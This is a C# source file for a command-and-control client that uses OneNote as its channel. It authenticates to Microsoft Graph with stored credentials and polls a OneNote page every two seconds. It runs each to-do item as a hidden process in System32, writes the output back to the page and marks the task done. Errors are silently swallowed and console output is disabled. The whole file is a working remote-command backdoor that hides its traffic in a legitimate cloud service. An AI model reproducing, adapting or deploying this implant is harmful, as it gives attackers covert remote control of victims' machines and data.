using Microsoft.Identity.Client;
using Newtonsoft.Json.Linq;
using System;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text;
using Newtonsoft.Json;
using System.Collections.Generic;
using HtmlAgilityPack;
using System.Threading;
using System.Web;
using System.Security;
using System.Configuration;

namespace OneNoteC2Client
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                RunAsync().GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                //Console.ForegroundColor = ConsoleColor.Red;
                //Console.WriteLine(ex.Message);
                //Console.ResetColor();
            }

            //Console.WriteLine("Press any key to exit");
            //Console.ReadKey();
        }

        private static async Task RunAsync()
        {
            try
            {
                AuthenticationResult result = null;
                result = await Auth();
                DateTime exp = result.ExpiresOn.DateTime;

                if (result != null)
                {
                    var pageid = await GetPageID(result.AccessToken);
                    while (true)
                    {
                        int exptime = DateTime.Compare(exp, DateTime.Now.ToUniversalTime().AddMinutes(10));
                        if (exptime < 0)
                        {
                            result = await Auth();
                            exp = result.ExpiresOn.DateTime;
                        }
                        await GetTask(result.AccessToken, pageid);
                        Thread.Sleep(2000);

                    }
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
            }
        }

        public static async Task<AuthenticationResult> Auth()
        {

            string[] scopes = new string[] { "https://graph.microsoft.com/.default" };
            IPublicClientApplication apps;
            apps = PublicClientApplicationBuilder.Create(ConfigurationManager.AppSettings["ClientId"].ToString())
                  .WithAuthority(AadAuthorityAudience.AzureAdMultipleOrgs)
                  .Build();
            var accounts = await apps.GetAccountsAsync();

            AuthenticationResult result = null;
            if (accounts.Any())
            {
                result = await apps.AcquireTokenSilent(scopes, accounts.FirstOrDefault())
                                  .ExecuteAsync();
            }
            else
            {
                try
                {
                    var securePassword = new SecureString();
                    foreach (char c in ConfigurationManager.AppSettings["Password"].ToString())        // you should fetch the password
                        securePassword.AppendChar(c);  // keystroke by keystroke

                    result = await apps.AcquireTokenByUsernamePassword(scopes, ConfigurationManager.AppSettings["UserName"].ToString(), securePassword).ExecuteAsync();
                }
                catch (MsalException ex)
                {
                    //Console.WriteLine(ex.Message);
                }
            }

            return result;
        }

        public static async Task<string> GetPageID(string AccessToken)
        {
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            pagedetails pageDetails = new pagedetails();
            var url = $"https://graph.microsoft.com/beta/me/onenote/pages";

            JObject pdetails = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);

            IList<JToken> pagedetailsresults = pdetails["value"].Children().ToList();

            IList<pagedetails> pagedetailssearchResults = new List<pagedetails>();
            foreach (JToken res in pagedetailsresults)
            {
                pageDetails = res.ToObject<pagedetails>();
                pagedetailssearchResults.Add(pageDetails);
            }

            return pageDetails.id;
        }

        public static async Task GetTask(string AccessToken, string pageid)
        {
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            var url = $"https://graph.microsoft.com/beta/me/onenote/pages/{pageid}/content?includeIDs=true";


            var retrivepagecontent = await apiCaller.CallGetHTMLWebApiAndProcessResultASync(url, AccessToken);

            HtmlDocument pageDocument = new HtmlDocument();
            pageDocument.LoadHtml(retrivepagecontent);

            var tasklist = pageDocument.DocumentNode.SelectNodes("(//p[@data-tag='to-do'])");
            if (tasklist != null)
            {
                foreach (HtmlNode task in tasklist)
                {
                    try
                    {
                        var output = ShellExecuteWithPath(System.Net.WebUtility.HtmlDecode(task.InnerText), "C:\\WINDOWS\\System32\\");
                        await UpdateTask(AccessToken, task.Id, pageid, task.InnerText, TextToHtml(output));
                    }
                    catch(Exception ex)
                    {
                        await UpdateTask(AccessToken, task.Id, pageid, task.InnerText, TextToHtml(ex.Message));
                    }
                }
            }
        }

        public static async Task UpdateTask(string AccessToken, string taskid, string pageid, string taskcommand, string taskoutput)
        {
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);
            string data = null;

            var url = $"https://graph.microsoft.com/beta/me/onenote/pages/{pageid}/content";
            createcontent createcontentdetails = new createcontent();

            createcontentdetails.target = taskid;
            createcontentdetails.action = "insert";
            createcontentdetails.content = $"<p data-id='output'>{taskoutput}</p>";

            data = "[" + JsonConvert.SerializeObject(createcontentdetails) + "]";


            JObject createtaskoutput = await apiCaller.CallPatchWebApiAndProcessResultASync(url, AccessToken, data);


            createcontentdetails.target = taskid;
            createcontentdetails.action = "replace";
            createcontentdetails.content = $"<p data-tag='to-do:completed'>{taskcommand}</p>";

            data = "[" + JsonConvert.SerializeObject(createcontentdetails) + "]";


            JObject taskupdate = await apiCaller.CallPatchWebApiAndProcessResultASync(url, AccessToken, data);

        }

        public static string ShellExecuteWithPath(string ShellCommand, string Path, string Username = "", string Domain = "", string Password = "")
        {
            if (ShellCommand == null || ShellCommand == "") return "";

            string ShellCommandName = ShellCommand.Split(' ')[0];
            string ShellCommandArguments = "";
            if (ShellCommand.Contains(" "))
            {
                ShellCommandArguments = ShellCommand.Replace(ShellCommandName + " ", "");
            }

            System.Diagnostics.Process shellProcess = new System.Diagnostics.Process();
            if (Username != "")
            {
                shellProcess.StartInfo.UserName = Username;
                shellProcess.StartInfo.Domain = Domain;
                System.Security.SecureString SecurePassword = new System.Security.SecureString();
                foreach (char c in Password)
                {
                    SecurePassword.AppendChar(c);
                }
                shellProcess.StartInfo.Password = SecurePassword;
            }
            shellProcess.StartInfo.FileName = ShellCommandName;
            shellProcess.StartInfo.Arguments = ShellCommandArguments;
            shellProcess.StartInfo.WorkingDirectory = Path;
            shellProcess.StartInfo.UseShellExecute = false;
            shellProcess.StartInfo.CreateNoWindow = true;
            shellProcess.StartInfo.RedirectStandardOutput = true;
            shellProcess.StartInfo.RedirectStandardError = true;

            var output = new StringBuilder();
            shellProcess.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
            shellProcess.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };

            shellProcess.Start();

            shellProcess.BeginOutputReadLine();
            shellProcess.BeginErrorReadLine();
            shellProcess.WaitForExit();

            return output.ToString().TrimEnd();
        }

        public static string TextToHtml(string text)
        {
            text = HttpUtility.HtmlEncode(text);
            text = text.Replace("\r\n", "\r");
            text = text.Replace("\n", "\r");
            text = text.Replace("\r", "<br>\r\n");
            text = text.Replace("  ", " &nbsp;");
            return text;
        }

    }
}
